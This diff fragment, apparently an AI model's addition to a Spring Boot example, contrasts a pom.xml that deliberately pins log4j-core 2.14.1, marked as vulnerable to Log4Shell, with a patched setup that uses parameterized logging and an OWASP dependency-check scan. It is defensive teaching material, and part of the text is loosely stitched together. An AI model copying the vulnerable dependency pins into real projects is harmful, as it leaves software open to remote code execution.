+        <artifactId>spring-boot-starter-parent</artifactId>
+        <version>2.6.0</version> <!-- vulnerable version -->
+    </parent>
+
+    <dependencies>
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-web</artifactId>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.logging.log4j</groupId>
+            <artifactId>log4j-core</artifactId>
+            <version>2.14.1</version> <!-- vulnerable to Log4Shell -->
+        </dependency>
+    </dependencies>
+
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>org.owasp</groupId>
+                <artifactId>dependency-check-maven</artifactId>
+                <version>8.4.0</version>
+                <executions>
+                    <execution>
+                        <goals>
+                            <goal>check</goal>
+                        </goals>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+</project>
+*/
+
+
+Safe Dependency Demo
+
+@RestController
+@RequestMapping("/log")
+class SafeLoggingController {
+    private static final Logger logger = LoggerFactory.getLogger(SafeLoggingController.class);
+
+    @GetMapping("/input")
+    public String logUserInput(@RequestParam String userInput) {
+        logger.info("User input: {}", userInput);  // Safe parameterized logging
+        return "Logged input securely.";
+    }
+}
+
+/*
+ * Safe pom.xml (secure dependencies and OWASP scan enabled)
+ */
+
+/**
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+    <groupId>com.example</groupId>
+    <artifactId>safedemo</artifactId>
+    <version>0.0.1-SNAPSHOT</version>
+    <packaging>jar</packaging>
+    <name>safedemo</name>
+
+    <parent>
+        <groupId>org.springframework.boot</groupId>
+        <artifactId>spring-boot-starter-parent</artifactId>
+        <version>3.2.0</version> <!-- Updated Spring Boot -->
+    </parent>
+
+    <dependencies>
+        <dependency>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-web</artifactId>
+        </dependency>
+        <!-- Logback is included by default in Spring Boot -->
+    </dependencies>
+
+    <build>
+        <plugins>
+            <plugin>
+                <groupId>org.owasp</groupId>
+                <artifactId>dependency-check-maven</artifactId>
+                <version>8.4.0</version>
+                <executions>
+                    <execution>
+                        <goals>
+                            <goal>check</goal>
+                        </goals>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
+</project>
+*/
+
+I 've added the following to your Spring Boot example:
+
+📦 A vulnerable pom.xml block using:
+
+Spring Boot 2.6.0
+log4j-core 2.14.1 (Log4Shell vulnerable)
+
+🔍 An integrated OWASP Dependency Check Maven plugin
+
+✅ Notes on how to fix it: upgrade Spring Boot, remove log4j, and use logback.
+ 
